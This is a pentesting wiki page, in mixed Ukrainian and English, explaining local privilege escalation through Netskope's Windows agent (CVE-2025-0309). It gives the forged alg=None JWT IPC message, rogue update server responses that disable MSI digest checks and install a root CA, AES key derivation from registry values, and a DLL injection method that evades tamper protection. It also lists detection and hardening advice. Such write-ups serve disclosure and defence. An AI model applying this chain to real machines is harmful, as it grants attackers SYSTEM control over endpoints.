# Зловживання Enterprise Auto-Updaters та Privileged IPC (e.g., Netskope stAgentSvc)

{{#include ../../banners/hacktricks-training.md}}

Ця сторінка узагальнює клас Windows local privilege escalation chains, які зустрічаються в enterprise endpoint agents та updaters, що відкривають low‑friction IPC surface і привілейований update flow. Репрезентативний приклад — Netskope Client for Windows < R129 (CVE-2025-0309), де low‑privileged user може примусити enrollment на attacker‑controlled сервер, а потім доставити шкідливий MSI, який встановлює сервіс SYSTEM.

Ключові ідеї, які можна використовувати проти схожих продуктів:
- Зловживати localhost IPC привілейованого сервісу, щоб примусити re‑enrollment або reconfiguration на attacker server.
- Реалізувати vendor’s update endpoints, доставити підроблений Trusted Root CA і вказати updater на шкідливий „signed” пакет.
- Обходитись зі слабыми перевірками signer (CN allow‑lists), optional digest flags та lax MSI properties.
- Якщо IPC «encrypted», виводити key/IV з загальнодоступних machine identifiers, що зберігаються в registry.
- Якщо сервіс обмежує викликачів за image path/process name, inject у allow‑listed процес або spawn one suspended і bootstrap your DLL через minimal thread‑context patch.

---
## 1) Примусове enrollment на attacker server через localhost IPC

Багато агентів постачають user‑mode UI процес, який спілкується з сервісом SYSTEM по localhost TCP використовуючи JSON.

Спостерігалося в Netskope:
- UI: stAgentUI (низької цілісності) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Потік експлоїта:
1) Сформуйте JWT enrollment token, чиї claims контролюють backend host (наприклад, AddonUrl). Використайте alg=None щоб підпис не був потрібен.
2) Надішліть IPC повідомлення, що викликає provisioning command з вашим JWT та tenant name:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Сервіс починає звертатися до вашого зловмисного сервера для реєстрації/конфігурації, наприклад:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Примітки:
- Якщо верифікація виклику базується на path/name‑based, ініціюйте запит з виконуваного файлу вендора, що знаходиться у списку дозволених (див. §4).

---
## 2) Перехоплення каналу оновлень для виконання коду як SYSTEM

Коли клієнт зв’язується з вашим сервером, реалізуйте очікувані endpoints і направте його на зловмисний MSI. Типова послідовність:

1) /v2/config/org/clientconfig → Повернути JSON конфіг з дуже коротким інтервалом оновлення, наприклад:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Повертає PEM CA certificate. Сервіс встановлює його в Local Machine Trusted Root store.
3) /v2/checkupdate → Повертає metadata, що вказує на зловмисний MSI і підроблену версію.

Bypassing common checks seen in the wild:
- Signer CN allow‑list: сервіс може перевіряти лише, чи Subject CN дорівнює “netSkope Inc” або “Netskope, Inc.”. Ваш Rogue CA може випустити leaf із цим CN і підписати MSI.
- CERT_DIGEST property: додайте benign MSI property з ім’ям CERT_DIGEST. Під час інсталяції не виконується enforcement.
- Optional digest enforcement: config flag (e.g., check_msi_digest=false) відключає додаткову криптографічну валідацію.

Результат: SYSTEM service встановлює ваш MSI з
C:\ProgramData\Netskope\stAgent\data\*.msi
та виконує arbitrary code як NT AUTHORITY\SYSTEM.

---
## 3) Forging encrypted IPC requests (when present)

From R127, Netskope загорнув IPC JSON у поле encryptData, яке виглядає як Base64. Реверсинг показав AES зі key/IV, похідними від значень у реєстрі, що читаються будь‑яким користувачем:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Атакуючі можуть відтворити шифрування і відправляти валідні зашифровані команди від імені стандартного користувача. Загальна порада: якщо агент раптом “encrypts” свій IPC, шукайте device IDs, product GUIDs, install IDs під HKLM як матеріал для ключів.

---
## 4) Bypassing IPC caller allow‑lists (path/name checks)

Деякі сервіси намагаються аутентифікувати пір шляхом резолвінгу PID TCP‑з’єднання і порівняння image path/name з allow‑listed vendor binaries у Program Files (наприклад, stagentui.exe, bwansvc.exe, epdlp.exe).

Два практичні обхідні шляхи:
- DLL injection в allow‑listed процес (наприклад, nsdiag.exe) та проксування IPC зсередини нього.
- Spawn allow‑listed binary у suspended стані і bootstrap ваш proxy DLL без CreateRemoteThread (див. §5), щоб задовольнити driver‑enforced tamper правила.

---
## 5) Tamper‑protection friendly injection: suspended process + NtContinue patch

Продукти часто постачають minifilter/OB callbacks driver (наприклад, Stadrv), щоб прибирати небезпечні права з handles до захищених процесів:
- Process: видаляє PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: обмежує до THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Надійний user‑mode loader, що поважає ці обмеження:
1) CreateProcess vendor binary з CREATE_SUSPENDED.
2) Отримайте handles, які вам ще дозволені: PROCESS_VM_WRITE | PROCESS_VM_OPERATION на процесі, і thread handle з THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (або просто THREAD_RESUME, якщо ви патчите код у відомому RIP).
3) Перезапишіть ntdll!NtContinue (або інший ранній, гарантовано‑маплений thunk) маленьким stub, що викликає LoadLibraryW з вашим шляхом до DLL, потім повертає виконання назад.
4) ResumeThread, щоб запустити ваш stub в процесі і завантажити вашу DLL.

Оскільки ви ніколи не використовували PROCESS_CREATE_THREAD або PROCESS_SUSPEND_RESUME на вже‑захищеному процесі (ви його створили), політика драйвера задовольняється.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) автоматизує rogue CA, malicious MSI signing і подає необхідні endpoints: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope — кастомний IPC client, що формує arbitrary (опційно AES‑encrypted) IPC messages і включає suspended‑process injection, щоб походити від allow‑listed binary.

---
## 7) Detection opportunities (blue team)
- Monitor additions до Local Machine Trusted Root. Sysmon + registry‑mod eventing (див. SpecterOps guidance) працюють добре.
- Flag MSI executions, ініційовані service агента з шляхів на кшталт C:\ProgramData\<vendor>\<agent>\data\*.msi.
- Переглядайте agent logs на предмет unexpected enrollment hosts/tenants, наприклад: C:\ProgramData\netskope\stagent\logs\nsdebuglog.log – шукайте addonUrl / tenant anomalies і provisioning msg 148.
- Alert на localhost IPC clients, які не є expected signed binaries або походять з дивних дерев дочірніх процесів.

---
## Hardening tips for vendors
- Bind enrollment/update hosts до strict allow‑list; reject untrusted domains у clientcode.
- Authenticate IPC peers через OS primitives (ALPC security, named‑pipe SIDs) замість перевірок image path/name.
- Тримайте secret material поза world‑readable HKLM; якщо IPC має бути encrypted, виводьте keys з protected secrets або домовляйтеся через authenticated channels.
- Розглядайте updater як supply‑chain surface: вимагайте повний chain до trusted CA, яку ви контролюєте, перевіряйте package signatures проти pinned keys і fail closed, якщо валідація відключена в конфігурації.

## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)

{{#include ../../banners/hacktricks-training.md}}
